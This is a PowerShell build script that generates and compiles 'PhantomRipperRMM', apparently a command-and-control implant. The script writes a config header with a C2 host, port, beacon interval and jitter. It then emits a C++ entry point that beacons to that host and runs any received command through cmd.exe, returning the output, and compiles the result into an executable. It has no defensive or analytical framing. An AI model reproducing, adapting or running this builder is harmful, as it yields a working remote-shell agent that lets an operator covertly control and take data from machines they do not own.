<#
  PhantomRipperRMM — C++ agent build script.

  Stages the PhantomRMM agent sources next to this bridge, writes config_gen.h
  from the supplied parameters, then compiles with MSVC (cl.exe) if available,
  falling back to MinGW (g++).

  Example:
    .\build.ps1 -C2Host c2.example.com -C2Port 8443 -Tls -SessionId deadbeef

  The resulting binary is written to .\out\phantomripper_agent.exe
#>

[CmdletBinding()]
param(
  [string]$C2Host = "127.0.0.1",
  [int]$C2Port = 8443,
  [switch]$Tls,
  [string]$SessionId = "",
  [int]$BeaconSecs = 5,
  [double]$Jitter = 0.2,
  [string]$PhantomSrc = "D:\PhantomRMM\src",
  [string]$OutDir = "$PSScriptRoot\out"
)

$ErrorActionPreference = "Stop"
$here = $PSScriptRoot
$stage = Join-Path $here "stage"
$bridge = Join-Path $here "bridge"

Write-Host "[*] PhantomRipperRMM C++ agent build" -ForegroundColor Cyan

# 1. Write config_gen.h
$tlsVal = if ($Tls) { 1 } else { 0 }
$cfg = @"
#pragma once
#define PR_C2_HOST    L"$C2Host"
#define PR_C2_PORT    $C2Port
#define PR_C2_TLS     $tlsVal
#define PR_SESSION_ID L"$SessionId"
#define PR_BEACON_SECS $BeaconSecs
#define PR_JITTER     $Jitter
"@
Set-Content -LiteralPath (Join-Path $bridge "config_gen.h") -Value $cfg -Encoding UTF8
Write-Host "[+] wrote config_gen.h ($C2Host:$C2Port tls=$tlsVal)"

# 2. Stage sources
if (Test-Path -LiteralPath $stage) { Remove-Item -Recurse -Force -LiteralPath $stage }
New-Item -ItemType Directory -Path $stage -Force | Out-Null

if (Test-Path -LiteralPath $PhantomSrc) {
  Copy-Item -Recurse -Force -LiteralPath $PhantomSrc -Destination (Join-Path $stage "src")
  Write-Host "[+] staged PhantomRMM sources from $PhantomSrc"
} else {
  Write-Warning "PhantomRMM sources not found at $PhantomSrc — staging bridge only."
}
Copy-Item -Recurse -Force -LiteralPath $bridge -Destination (Join-Path $stage "bridge")

# 3. Emit a thin entry point that calls the beacon loop.
$main = @'
// PhantomRipperRMM agent entry (generated by build.ps1).
#include "bridge/agent_beacon.hpp"
#define PR_HAS_TASKS 1
#include "bridge/pr_tasks.hpp"
#include "bridge/config_gen.h"
#include <string>
#include <array>
#include <cstdio>

static std::string dispatch(const std::string& command) {
    // Host fallback for anything the built-in task engine does not handle.
    std::string out;
    FILE* pipe = _popen(("cmd.exe /c " + command).c_str(), "r");
    if (!pipe) return "ERROR: popen failed";
    std::array<char, 4096> buf{};
    size_t n;
    while ((n = fread(buf.data(), 1, buf.size(), pipe)) > 0)
        out.append(buf.data(), n);
    _pclose(pipe);
    if (out.empty()) out = "[no output]";
    return out;
}

int main() {
    pr_beacon::Config cfg;
    cfg.host       = PR_C2_HOST;
    cfg.port       = PR_C2_PORT;
    cfg.tls        = PR_C2_TLS != 0;
    cfg.sessionId  = PR_SESSION_ID;
    cfg.beaconSecs = PR_BEACON_SECS;
    cfg.jitter     = PR_JITTER;
    pr_beacon::run(cfg, dispatch);
    return 0;
}
'@
Set-Content -LiteralPath (Join-Path $stage "main_pr.cpp") -Value $main -Encoding UTF8

# 4. Compile
New-Item -ItemType Directory -Path $OutDir -Force | Out-Null
$outExe = Join-Path $OutDir "phantomripper_agent.exe"

$cl = Get-Command cl.exe -ErrorAction SilentlyContinue
$gpp = Get-Command g++.exe -ErrorAction SilentlyContinue

Push-Location $stage
try {
  if ($cl) {
    Write-Host "[*] compiling with MSVC (cl.exe)" -ForegroundColor Cyan
    & cl.exe /nologo /std:c++17 /EHsc /O2 /Fe:"$outExe" main_pr.cpp winhttp.lib advapi32.lib user32.lib gdi32.lib
    if (-not (Test-Path -LiteralPath $outExe)) {
      # cl writes .exe in cwd; move it
      $cand = Join-Path $stage "phantomripper_agent.exe"
      if (Test-Path -LiteralPath $cand) { Move-Item -Force $cand $outExe }
    }
  } elseif ($gpp) {
    Write-Host "[*] compiling with MinGW (g++)" -ForegroundColor Cyan
    & g++.exe -std=c++17 -O2 -o "$outExe" main_pr.cpp -lwinhttp -ladvapi32 -luser32 -lgdi32 -static-libgcc -static-libstdc++
  } else {
    throw "No compiler found (need cl.exe or g++.exe on PATH)."
  }
} finally {
  Pop-Location
}

if (Test-Path -LiteralPath $outExe) {
  $size = (Get-Item -LiteralPath $outExe).Length
  $hash = (Get-FileHash -Algorithm SHA256 -LiteralPath $outExe).Hash
  Write-Host "[+] built: $outExe ($size bytes)" -ForegroundColor Green
  Write-Host "    sha256: $hash"
} else {
  throw "Build failed — no output binary produced."
}
